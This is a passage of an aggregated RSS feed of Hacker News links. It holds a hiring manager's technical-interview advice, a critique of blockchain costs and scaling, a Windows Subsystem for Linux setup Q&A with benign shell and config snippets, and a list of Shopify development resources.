<p>The thing is, you’ll rarely work alone in isolation on your own codebase. You’ll have teammates, you’ll need to agree on things with them, you’ll build on others’ code and others will build on your code. You’ll need to build solutions with a certain level of quality, in a future-proof way, for extensibility, and with performance in mind. Depending on your role and level, you’ll need to architect systems. You’ll need to mentor other engineers. You’ll need to onboard new team members. You’ll need to proactively reach out to other teams in the company and understand their points of view and problems. You’ll talk to product managers, UX researchers, designers, even customers sometimes. You’ll need to manage projects, make tradeoffs and decisions, and align other engineers with that.</p>
<p>Read my article about&nbsp;<a href="https://ochronus.online/technical-interview-myths/">the most common 11 technical interview myths</a> – you’ll get a better view of how people think on the other side of the table.</p>
<h2 id="types-and-stages-of-technical-interviews"><span id="Types_and_stages_of_technical_interviews">Types and stages of technical interviews</span></h2>
<p>Most companies use a combination of these steps:</p>
<ul><li>Screening call with a recruiter – We’re interested in your basic motivations; we’d like to have a gut feeling about what you’re looking for and do some sanity check here. You might get asked about your salary requirements, support you need for visa or relocation, timelines (when could you start, etc.). Some recruiters will also ask you whether you have applied elsewhere, so they know how urgent this is for them and you.</li><li>Screening call with the hiring manager – Expect some deeper dive into your experience on multiple fronts – tech and ‘soft skills’ alike. As a hiring manager, I’ll prepare by checking out your CV for talking points, maybe even your LinkedIn profile, and definitely GitHub. I’m not trying to judge you; I’m just looking for points of connection. I’ll answer any questions you have about the role, the company, the culture, potential teams you’d be joining, etc. My ultimate goal with this is twofold: would we be a good match for your (and vice versa) and whether I think you’d be successful in the role.</li><li>Remote technical screening – An alternative, or at some places precursor to the online coding exercise. This is with a human on the other end of the line – solving tech problems together; usually, you walk them through your solution.</li><li>Online coding exercises (LeetCode, HackerRank, etc.) – I know you all hate this. We need such a step to filter out people who can’t even code at all early on. You’d be surprised about the number of such applicants. I avoid algorithm/data structure exercises here and try to come up with somewhat interesting ones. Some companies use a much heavier set of exercises and judge your technical skills solely on this. While I disagree with that strategy, you need to get prepared for this, too.</li><li>Take-home assignment – this is one of the most polarizing interview steps for engineers. Some hate it, claiming it’s just free labor for the companies, and it takes too much time. Others love it because they feel they have the freedom to give it much time, really showing off their skills in their own comfortable environment. <a href="https://levelup.gitconnected.com/take-home-assignment-mistakes-which-will-guarantee-someone-else-gets-the-job-36bcee1cec1d" target="_blank" rel="noopener">Whichever camp you’re in</a>, you can expect some companies requiring this. You usually get a somewhat specified problem to solve, and you’re given different levels of freedom on how to solve it – some companies don’t mind you choosing whichever stack you like; others will even specify the framework.</li><li>Onsite workshop / remote workshop – I think this is the most interesting of all steps (well, for me, at least). It’s about solving problems together with people from the company in a simulated environment. You’ll need to show your communication, decision-making, and even prioritization skills here. Sure, people will look at your code’s quality, too, but ‘soft skills’ are just as important here. We’ll get strong signals about how it would be to have you on the team.</li></ul>
<h2 id="cracking-the-technical-interview"><span id="Cracking_the_technical_interview">Cracking the technical interview</span></h2>
<h3 id="ask-the-recruiter-or-the-hiring-manager-before-the-interview"><span id="Ask_the_recruiter_or_the_hiring_manager_before_the_interview">Ask the recruiter or the hiring manager before the interview</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg.webp 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 306px) 100vw, 306px">
<img width="306" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" alt="ask the recruiter or hiring manager 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg 300w" data-lazy-sizes="(max-width: 306px) 100vw, 306px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg">
</picture>
</figure>
<p>Take the guesswork out of the equation. If you feel you don’t have enough information to prepare for your technical interview, just ask for more! We’re here to help you succeed. I really mean it. Sometimes we aren’t doing a great job with sharing enough information proactively about the interview steps but that’s not intentional! I’m always happy to help you prepare better – ask about anything, please. You’re doing both of us a favor with that. Simply ask during the previous technical interview step or just drop me or the recruiter an email at any time.</p>
<h3 id="show-up-on-time"><span id="Show_up_on_time">Show up on time</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg.webp 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 399px) 100vw, 399px">
<img width="399" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" alt="arrive on time 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg 300w" data-lazy-sizes="(max-width: 399px) 100vw, 399px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg">
</picture>
</figure>
<p>Make sure you arrive at your technical interview on time. If you can’t, for some reason, please let us know, we’ll happily reorganize for another time, no hard feelings (sh*t happens). Showing up on time isn’t only about respecting each other’s schedule – interview time slots are usually 100% utilized and by arriving 10 minutes late you’re reducing your own chance to be successful. You’re also making it more stressful for yourself than necessary. If you need time for commute or for your Zoom/Google Meet setup, think ahead and give yourself a buffer before the start. You’ll also love the extra 10 minutes before the interview to tune in and get calmer.</p>
<h3 id="don-t-jump-right-into-solution-mode-read-distill-paraphrase"><span id="Dont_jump_right_into_solution_mode_-_read_distill_paraphrase">Don’t jump right into solution mode – read, distill, paraphrase</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg.webp 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 328px) 100vw, 328px">
<img width="328" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" alt="read distill paraphrase 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg 300w" data-lazy-sizes="(max-width: 328px) 100vw, 328px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg">
</picture>
</figure>
<p>The biggest mistake you can do is thinking you understand the problem or what’s asked of you and jumping right into coding in the technical interview. Take your time, carefully read the problem statement, distill it, don’t think of solutions just yet. When you feel you understand what’s asked of you or when you thought about clarifying questions to ask, communicate. <a href="https://www.mindtools.com/pages/article/paraphrasing-summarizing.htm" target="_blank" rel="noopener">Paraphrase</a> what you understood from the problem statement so you can verify it with your interviewers. Only when you’re on the same page can you shift into solution mode. Even if you come up with the best solution ultimately if you skip this step I’ll remember and have doubts about how it’d be to work with you. Thinking aloud is really useful here – it will help you and help me too to understand what’s on your mind.</p>

<h3 id="be-articulate-and-communicate-clearly"><span id="Be_articulate_and_communicate_clearly">Be articulate and communicate clearly</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg.webp 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 401px) 100vw, 401px">
<img width="401" height="255" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" alt="communicate clearly" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg 300w" data-lazy-sizes="(max-width: 401px) 100vw, 401px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg">
</picture>
</figure>
<p>Even if you know your trade and you’re the best engineer in the world, if you fail to communicate clearly during the technical interview we’ll have no way of knowing. This takes practice for most people, so take your time and prepare! Use standard terms that other engineers can relate to, avoid passive voice, and be able to articulate what’s going on in your mind while you’re thinking. If you need some time to think quietly, say so, don’t just fall silent suddenly. We’re trying our best to communicate our expectations around this but it might be a bit late when you’re in the interview. Trust me on this one, practice here goes a long way.</p>
<h3 id="ask-clarifying-questions"><span id="Ask_clarifying_questions">Ask clarifying questions</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 7">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E">
<img width="269" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E" alt="ask clarifying questions 1" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg">
</picture>
</figure>
<p>While you’d think the technical interview is about you answering questions, expect that you will need to ask a lot of them, too! When you are in the interview and something is not clear don’t default to thinking “Oh god, I should know this, I should understand” – sometimes we are interested in how you behave in such situations, and sometimes we’re just simply not good enough in giving enough context. If you’re stuck, a good technique is to ask for clarification! It’s also 100% OK to say things like “I didn’t quite get that. Could you rephrase please?” or “I’m not sure I understand what you’re asking”. These are good signals! I expect my team members to behave like this. These are not signals of you failing. I know it feels like that, but trust me, it’s just your brain playing tricks on you. I highlight this during the interview several times, to make sure the candidate feels safe asking such questions. Another technique I wholeheartedly welcome is paraphrasing – e.g. “What I understood from what you said is that I should implement this using co-monads” (said nobody ever).</p>
<h3 id="demonstrate-your-tech-skills-the-right-way"><span id="Demonstrate_your_tech_skills_the_right_way">Demonstrate your tech skills the right way</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 8">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E">
<img width="293" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E" alt="t shaped engineer" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg">
</picture>
</figure>
<p>Make us see that you’re deeply proficient in at least one technology. This can be a programming language, for example. Also, demonstrate that you know the adjacent technologies – most companies are looking for so-called <a href="https://www.forbes.com/sites/davidmichels/2019/09/27/going-pi-shaped-how-to-prepare-for-the-work-of-the-future/" target="_blank" rel="noopener">T-shape</a> engineers. This means that mentioning other aspects of the problem and the solution goes a long way. For example, if you’re asked to implement a service in NodeJS, mention how you’d deploy, monitor, and scale it, even if that’s not explicitly asked. No need to go into too many details (unless people ask you). If you’re only focused on a single piece of the puzzle I’ll have a hard time seeing how you’d perform well in a changing environment (where you’ll need to make connections and work on multiple zoom levels and be ready). This is a very generic statement and might not be true in the case of highly specialized roles, of course. On the other hand, …</p></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/acing-the-tech-interview/">https://ochronus.online/acing-the-tech-interview/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/acing-the-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067800</guid>
            <pubDate>Thu, 12 Nov 2020 08:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need a blockchain solution for your next project]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25067702">thread link</a>) | @shrmv
<br/>
November 12, 2020 | https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project | <a href="https://web.archive.org/web/*/https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Blockchain is one of the hottest technology fields of the last decade, together with machine learning and big data. According to the <a rel="nofollow" href="https://www2.deloitte.com/content/dam/insights/us/articles/6608_2020-global-blockchain-survey/DI_CIR%202020%20global%20blockchain%20survey.pdf">Deloitte 2020 Global Blockchain Survey</a>, businesses worldwide find blockchain an integral part of organizational innovation. </p>
<p>Properly implemented, a blockchain solution can make parts of your business transparent or enable different actors to cooperate quickly and trustlessly. </p>
<p>But today, we wonâ€™t examine blockchainâ€™s strengths. Instead, we will look at why itâ€™s not the perfect choice for all your software projects.  </p>
<h2>Blockchain is more expensive</h2>
<p>From our experience, infrastructure and maintenance costs for a blockchain solution are typically 10-15 times higher compared to an ordinary server with a database running on AWS or a custom AWS/GCP/Azure solution.</p>
<p>Even when using economically efficient Azure solutions, it can cost up to ten times more when compared to a centralized DB with similar functionality running on AWS.</p>
<p>Therefore, itâ€™s necessary to seriously weigh the costs of running your solution vs. the need for transparency and distribution that blockchain offers. </p>
<h2>Blockchain scales worse</h2>
<p>Performance and scalability are the two major bottlenecks for any blockchain project. </p>
<p>From our experience working for large enterprise companies such as Bayer AG, Delta, PwC, and others, blockchain solutions that work fine for hundreds and thousands of users degrade in performance quite quickly when they need to serve more than ten thousand users.</p>
<p>Scaling blockchain, on the other hand, usually requires a complete rework of the core. Sometimes, there might even be no viable solution. So, despite some ambitious claims by blockchain companies, scaling is still an immature topic in the blockchain world.</p>
<h2>Blockchain is about transparency, not privacy</h2>
<p>Privacy is an issue. It is challenging to maintain privacy on the blockchain. In contrast to regular solutions, existing blockchain solutions are often all about transparency rather than privacy.</p>
<p>Solutions that provide the required level of privacy typically have to compromise on performance through zero-knowledge proofs or other kinds of encryption, which is costly.</p>
<p>Another problem with privacy is that most of the time, blockchain is permissionless or has very primitive permissions levels. Therefore, solutions for permissions are built on top of it as an additional middle layer, which, of course, adds performance overhead, degrades scalability, adds implementation and execution costs, etc.
Conclusion</p>
<p>There are three significant challenges that blockchain projects face: performance, scalability, and privacy. While there are multiple benefits for using blockchain, such as transparency and the ability to operate trustlessly, they need to be weighed against the downsides. </p>
<p>We want to share our knowledge with you about potential problems not to talk you away from blockchain, but to make sure the choice is clear and the right one for your project. If you still arenâ€™t sure and would like to have a 30-minute consultation with an expert in the field, youâ€™re welcome to <a href="https://exyte.com/contacts">contact us</a>. </p>
                </div></div>]]>
            </description>
            <link>https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067702</guid>
            <pubDate>Thu, 12 Nov 2020 08:25:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WSL explained – crucial Q&A to get to know near-native Linux experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067677">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><a href="https://solidstudio.io/index.html">Solidstudio</a>
                    &gt;&gt;
                    <a href="https://solidstudio.io/blog/blog.html">Blog</a>
                    &gt;&gt;
                    &gt;Windows Subsystem for Linux (WSL) explained – Q&amp;A
                </p>
                <p>No matter if you program in <a href="https://solidstudio.io/technologies/java.html">Java</a> or <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> or with other technologies, operating on Linux has a number of advantages. One of them is access to Linux Bash with its useful commands.</p>
                <p>However, some developers have to or prefer working on Windows. As stackoverflow.com 2020 <a href="https://insights.stackoverflow.com/survey/2020#development-environments-and-tools" rel="nofollow">survey</a> showed, almost half of developers (45,8%) work in the Windows environment. There are tools that bring them closer to the Linux world like <a href="https://www.cygwin.com/" ref="nofollow">Cygwin</a>.</p>
                
                <h2>The WSL provides a near-native Linux experience</h2>
                <p>Some time ago Microsoft introduced WSL, a new tool that brings Windows users even closer to the Linux experience. Here you can find gathered some frequently asked questions and our expert’s experience to help you get a better understanding of the WSL.</p>
                
                <h3>What is WSL?</h3>
                <p>WSL or Windows Subsystem for Linux is a part of the Windows operating system that allows running native Linux binaries. A number of distributions exist that can be installed and used. </p>
                
                <h3>How can I install WSL?</h3>
                <p>First thing to do before installing any Linux distribution is to install the WSL itself.</p>
                <p>Go to <i>Control Panel</i> → <i>Programs</i> → <i>Programs and Features</i> → <i>Turn Windows features on and off</i>.</p>
                <p>Select <i>Windows Subsystem for Windows</i>, confirm, and restart the system.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/wsl-install.png" alt="Turn Windows features on and off dialog with Windows Subsystem for Linux selected"></p><p>Now you are ready to select and install a Linux distribution of your choice.</p>
                                
                <h3>What Linux distributions are available on WSL?</h3>
                <p>To find a list of available distributions open Windows Store and search for "Linux".<br>
                The most popular are:
                </p><ul>
                <li>Ubuntu 18.04 and 20.04</li>
                <li>SUSE Linux Enterprise Server</li>
                <li>Debian</li>
                <li>Fedora Remix for WSL</li>
                <li>Kali Linux</li>
                </ul>                
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-store-search.png" alt="Windows Store search result for term Linux"></p><h3>Is it possible to run graphical Linux applications from WSL?</h3>
                <p>Yes, it is possible. You need to install an X Window System server application on your Windows, for example <a href="https://sourceforge.net/projects/xming/" rel="nofollow">Xming X Server for Windows</a>.</p>
                <p>Then check if your WSL system has a <span>DISPLAY</span> environment variable set up. If not set it to <span>:0</span>.</p>
                <pre>export DISPLAY=:0</pre>
                <p>After this configuration you are free to run native Linux applications with user interface.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/xclock.png" alt="WSL running xclock via Xming"></p><h3>Where is wsl.conf located?</h3>
                <p>Each WSL instance can be further configured by creating and editing a config file <span>/etc/wsl.conf</span>.</p>
                
                <h3>How to access Windows files from WSL?</h3>
                <p>All fixed drives with the NTFS or ReFS file system are automatically mounted in <span>/mnt</span> directory. For example a C: drive can be accessed in <span>/mnt/c/</span>. The directory where drives are mounted can be specified in <span>/etc/wsl.conf</span> as follows:</p>
                <pre>[automount]
root=/</pre>
                <p>This setting will cause drives to be mounted under the root folder, so the C: drive would be accessible through <span>/c</span> folder.</p>

                <h3>How to access pendrive from WSL?</h3>
                <p>Unlike fixed drives, removable drives are not mounted automatically. To access files stored on a USB stick you need to mount it yourself. For this purpose, use these commands (assume the drive letter in Windows is F):</p>
                <pre>sudo mkdir /mnt/f
sudo mount -t drvfs H: /mnt/f</pre>

                <h3>How to connect to a DVD drive from WSL?</h3>
                <p>Optical drives are not as popular nowadays as they used to be. Nonetheless, they can be accessed the same way as pendrives (assume G is the drive letter):</p>
                <pre>sudo mkdir /mnt/g
sudo mount -t drvfs G: /mnt/g</pre>

                <h3>Where are WSL files stored?</h3>
                <p>WSL files are exposed through a network share <span>\\wsl$\[distro name]</span>, for example my home directory is at <span "="">\\wsl$\Ubuntu-20.04\home\pawelb</span>.</p>
                <p>Physically the WSL files are located at <span>%USERPROFILE%\AppData\Local\Packages\[distro name]</span>. My home folder is at this rather long path <span>C:\Users\pawelb\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home\pawelb</span>.</p>
                <p>However, it is worth noting that manipulating WSL files from within Windows should be avoided as it can destroy Linux-specific file metadata. If you need to manipulate files on both WSL and Windows, store them on a Windows drive and access them from within WSL via <span>/mnt</span>.</p>
                
                <h3>Is it possible to run Windows programs from within WSL?</h3>
                <p>Yes, the WSL was built with interoperability in mind. It can run native Windows programs. However, if this feature is not needed, the user can disable it by adding <span>enabled=false</span> into <span>[interop]</span> section in <span>wsl.conf</span>.</p>
                <pre>[interop]
enabled=false</pre>

                
                <h3>What terminal application to use?</h3>
                <p>Any terminal can do the job, even the good old <span>cmd.exe</span>. Just run the WSL command in. There is however one great application that makes running the WSL console easier. It’s <a href="https://docs.microsoft.com/en-us/windows/terminal/get-started" rel="nofollow">Windows Terminal</a> and it can be installed from Windows Store. It automatically detects any WSL distributions installed and adds an option to run its console. It also supports regular Windows Command Line, PowerShell, and Azure console out of the box. Also, it supports tabs and split view inside a tab.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-terminal.png" alt="Windows Terminal application"></p><h3>Caveats of interoperability with Windows</h3>
                <p>By default, WSL can run Windows binaries and also appends its <span>%PATH%</span> variable into the <span>$PATH</span> variable of Linux running under WSL. In most cases, this is useful or at least does no harm. However, sometimes unexpected behavior occurs.</p>
                <p>This happened when I tried to run <span>npm</span>.</p>
                <pre>$ npm -v
module.js:471
    throw err;
    ^

Error: Cannot find module '\\wsl$\Ubuntu-20.04\c\Programs\nvm\v6.10.2\node_modules\npm\bin\npm-cli.js'
    at Function.Module._resolveFilename (module.js:469:15)
    at Function.Module._load (module.js:417:25)
    at Module.runMain (module.js:604:10)
    at run (bootstrap_node.js:393:7)
    at startup (bootstrap_node.js:150:9)
    at bootstrap_node.js:508:3</pre>
                
                <p>This error message is not helpful at all. What happened?</p>
                <p>After some investigation, I found out that I had also installed npm on Windows and WSL was using this executable to run. This unfortunately failed under WSL environment.</p>
                <p>A fix was rather simple. I disabled appending Windows <span>%PATH%</span> to WSL <span>$PATH</span>.</p>
                <p>This can be done in two ways.</p>
                <p>The first is to use the Registry Editor (regedit) to add a DWORD <span>AppendNtPath</span> with value <span>0</span> under <span>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss</span>. This affects all WSL distributions.</p>
                <p>The second way is to set a property in <span>/etc/wsl.conf</span>. This affects only a single distribution.</p>
                <pre>[interop]
appendWindowsPath=false</pre>

                <h2>The WSL is a great subsystem for Windows </h2>
                <p>With the introduction of Windows 10, a lot has changed. It seems that the system and its features are more and more thought-out and intuitive. A programmer needs a proper working environment. With WSL, Windows is keeping up with developments in this area, and looks like it is a step in the right direction. It’s worth having an eye on the development of this solution, hoping that in the future the developers will have a variety of systems that can really compete with each other. Looking for a good and stable, seamless tool, it is worth trying with the WSL.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067677</guid>
            <pubDate>Thu, 12 Nov 2020 08:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Become a Shopify Developer – Resources to Become a Shopify Dev]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25067407">thread link</a>) | @iliashad
<br/>
November 11, 2020 | https://iliashaddad.com/blog/how-to-become-shopify-developer | <a href="https://web.archive.org/web/*/https://iliashaddad.com/blog/how-to-become-shopify-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><article><div><p><span>
      <a href="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="how to become shopify developer 0" title="how to become shopify developer 0" src="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg" srcset="https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/bce2d/how-to-become-shopify-developer-0.jpg 250w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/953fe/how-to-become-shopify-developer-0.jpg 500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/0a251/how-to-become-shopify-developer-0.jpg 1000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/e3932/how-to-become-shopify-developer-0.jpg 1500w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/451a4/how-to-become-shopify-developer-0.jpg 2000w,https://iliashaddad.com/static/376fa9f372b3050b854b10d91b9c4224/af240/how-to-become-shopify-developer-0.jpg 2600w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
  </a>
    </span></p><p>Shopify has been growing so fast in the last couple of years. “We made history in 2018: no other SaaS company has crossed the $1 billion-dollar revenue mark at a faster growth rate than Shopify has,” said <a href="https://investors.shopify.com/Investor-News-Details/2019/Shopify-Announces-Fourth-Quarter-and-Full-Year-2018-Financial-Results/default.aspx">Tobi Lütke</a></p><p>I’m a self-taught developer who worked as a freelancer and indie maker in 2019 and I learned Shopify app and theme development and I want to share with you resources that help me to become a Shopify developer</p><h3><strong>Prerequisite to learn Shopify Theme Development&nbsp;:</strong></h3><p>Shopify theme is like WordPress themes but Shopify use their markup language (Liquid ) instead of PHP</p><p>You need to</p><ul><li>have basic knowledge with HTML5, CSS3, and JavaScript</li><li>have basic knowledge with jQuey (Many Shopify libraries use jQuery ) — Optional</li><li>have basic knowledge with Command Line</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to upload and test your Shopify theme (Free with unlimited Shopify store for development)</li></ul><h3>Prerequisite to learn Shopify App Development&nbsp;:</h3><p>Shopify app is a web app and you can use any programming language like Ruby, Python, PHP or Node JS to build one and in this guide, I’ll focus on Node JS in this guide</p><p>You need to&nbsp;:</p><ul><li>have basic knowledge with HTML5, CSS3</li><li>a good understanding of JavaScript and React (Shopify Polaris built With React but you can use any framework or just vanilla JS)</li><li>good understanding of how to build a full-stack web application (Authentication, consume external API, Send Requests from the front end and deal with it in the back end )</li><li>have basic knowledge with GraphQL (Shopify API built with GraphQL)</li><li>Create a <a href="https://accounts.shopify.com/signup">Shopify Partner account</a> to create, test and publish your Shopify app (Free)</li></ul><h3>Ressources to learn Shopify Theme Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://www.skillshare.com/classes/Shopify-Essentials-for-Web-Developers-From-Store-Setup-to-Custom-Themes/1070001866/projects">Shopify for web dev</a>elopers: (Free course) Set up your first Shopify store and create your first custom Shopify theme by a Shopify Expert</li><li><a href="https://www.skillshare.com/classes/Advanced-Shopify-Theme-Development/708093439?utm_campaign=video-embed-708093439&amp;utm_source=Video&amp;utm_medium=video-embed">Advanced Shopify</a> Theme: (Free course) Create advanced Shopify theme (Make Shopify theme a single web app using AJAX ) by a Shopify expert</li><li><a href="https://www.shopify.co.uk/partners/shopify-cheat-sheet">Liquid Cheatsheet</a>: Cheatsheet to get all Shopify liquid variables, filters, and helpers</li><li><a href="https://shopify.github.io/liquid-code-examples/">Liquid Code Examples:</a> Collection of code snippets to speed up your development process and understand how to write liquid code</li><li><a href="https://www.youtube.com/playlist?list=PLXQCP3o-w1Pvras8iuflJKO3tfkBT8c0c">Shopify YB Playlist:</a> Youtube course to learn Shopify theme development</li><li><a href="https://shopify.github.io/themekit/">Shopify Theme Kit</a>: a command-line tool to upload your Shopify theme to a Shopify store automatically when changes are made locally</li><li><a href="https://help.shopify.com/en/themes/development">Shopify Theme Docs</a>: Shopify docs to create your Shopify theme</li></ul><h3>Ressources to learn Shopify App Development</h3><ul><li><a href="https://www.shopify.com/partners/blog/">Shopify Partner Blog</a>: Articles and guides about design inspiration, Shopify development tips</li><li><a href="https://www.shopify.com/partners/academy">Shopify Partner Academy</a>: Free courses from Shopify team to learn how to work with Shopify tools</li><li><a href="https://developers.shopify.com/tutorials/build-a-shopify-app-with-node-and-react/set-up-your-app">Shopify React Node App</a>: Tutorial by Shopify team to create your first React and Node JS Shopify app using Polaris (Shopify React design system) and KOA Js to handle server-side rendering</li><li><a href="https://github.com/Shopify/shopify-app-cli">Shopify App CLI:</a> Create your Shopify app like (Create React App), serve your shopify app in Ngrok server (Free) and update your Ngrok server link automatically in your Shopify App dashboard</li></ul><h3>Conclusion</h3><p>Thanks for reading, I wish you the best on your new journey.</p></div></article></div></main></div></div>]]>
            </description>
            <link>https://iliashaddad.com/blog/how-to-become-shopify-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067407</guid>
            <pubDate>Thu, 12 Nov 2020 07:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Custom GitHub Actions with Docker]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066079">thread link</a>) | @sethetter
<br/>
